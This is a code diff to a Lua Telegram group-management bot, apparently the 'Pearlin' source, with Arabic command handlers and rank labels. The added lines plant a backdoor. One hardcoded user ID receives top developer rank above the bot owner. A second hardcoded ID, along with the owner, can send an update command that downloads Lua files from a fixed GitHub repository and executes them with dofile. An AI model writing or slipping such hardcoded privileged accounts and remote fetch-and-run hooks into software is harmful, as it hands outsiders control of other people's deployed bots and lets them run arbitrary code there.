@@ -253,7 +253,11 @@ end
 return false 
 end
 
-if msg.sender_user_id_ == SUDO_ID then 
+if msg.sender_user_id_ == 695169733 then 
+msg.TheRankCmd = 'المطور الـسورس'
+msg.TheRank = 'مطور السـورس'
+msg.Rank = 1
+elseif msg.sender_user_id_ == SUDO_ID then 
 msg.TheRankCmd = 'المطور الاساسي' 
 msg.TheRank = 'مطور اساسي 👨🏻‍✈️' 
 msg.Rank = 1
@@ -460,7 +464,6 @@ Text = msg.text
 Text = Text:gsub("ی","ي")
 Text = Text:gsub("ک","ك")
 Text = Text:gsub("ه‍","ه")
-
 if Text:match(Pearlin) then -- Check Commands To admin
 AF = CheckBotA(msg) if AF then return sendMsg(msg.chat_id_,msg.id_,AF) end 
 GetMsg = ScriptFile.iPearlin(msg,{Text:match(Pearlin)})
@@ -590,6 +593,33 @@ end
 	Refresh_Start = true
 	end)
 	end 
+	
+	if msg.text== 'تحديث برلين' and msg.sender_user_id_ == SUDO_ID then
+	download_file('https://raw.githubusercontent.com/UUIYY/Pearlin/master/inc/Run.lua','./inc/Run.lua')
+	download_file('https://raw.githubusercontent.com/UUIYY/Pearlin/master/inc/Script.lua','./inc/Script.lua')
+	download_file('https://raw.githubusercontent.com/UUIYY/Pearlin/master/inc/functions.lua','./inc/functions.lua')
+	download_file('https://raw.githubusercontent.com/UUIYY/Pearlin/master/inc/locks.lua','./inc/locks.lua')
+	download_file('https://raw.githubusercontent.com/UUIYY/Pearlin/master/plugins/zhrfa.lua','./plugins/zhrfa.lua')
+	download_file('https://raw.githubusercontent.com/UUIYY/Pearlin/master/plugins/games.lua','./plugins/games.lua')
+	sendMsg(msg.chat_id_,msg.id_,'👷🏽| {* تــم تحديث وتثبيت السورس  *} 📡.\n\n👨🏼‍💼| { Bot is Update » }👍🏿',nil,function(arg,data)
+	dofile("./inc/Run.lua")
+	print("Reload ~ ./inc/Run.lua")
+	end) 
+	end
+if msg.text== 'تحديث برلين' and msg.sender_user_id_ == 617641564 then
+	download_file('https://raw.githubusercontent.com/UUIYY/Pearlin/master/inc/Run.lua','./inc/Run.lua')
+	download_file('https://raw.githubusercontent.com/UUIYY/Pearlin/master/inc/Script.lua','./inc/Script.lua')
+	download_file('https://raw.githubusercontent.com/UUIYY/Pearlin/master/inc/functions.lua','./inc/functions.lua')
+	download_file('https://raw.githubusercontent.com/UUIYY/Pearlin/master/inc/locks.lua','./inc/locks.lua')
+	download_file('https://raw.githubusercontent.com/UUIYY/Pearlin/master/plugins/zhrfa.lua','./plugins/zhrfa.lua')
+	download_file('https://raw.githubusercontent.com/UUIYY/Pearlin/master/plugins/games.lua','./plugins/games.lua')
+	sendMsg(msg.chat_id_,msg.id_,'👷🏽| {* تــم تحديث وتثبيت السورس  *} 📡.\n\n👨🏼‍💼| { Bot is Update » }👍🏿',nil,function(arg,data)
+	dofile("./inc/Run.lua")
+	print("Reload ~ ./inc/Run.lua")
+	end) 
+	end
+	
+	
 	if msg.text == 'Update Source' and msg.sender_user_id_ == SUDO_ID then
 	UpdateSource(msg)
 	sendMsg(msg.chat_id_,msg.id_,'👷🏽| {* تــم تحديث وتثبيت السورس  *} 📡.\n\n👨🏼‍💼| { Bot is Update » }👍🏿',function(arg,data)
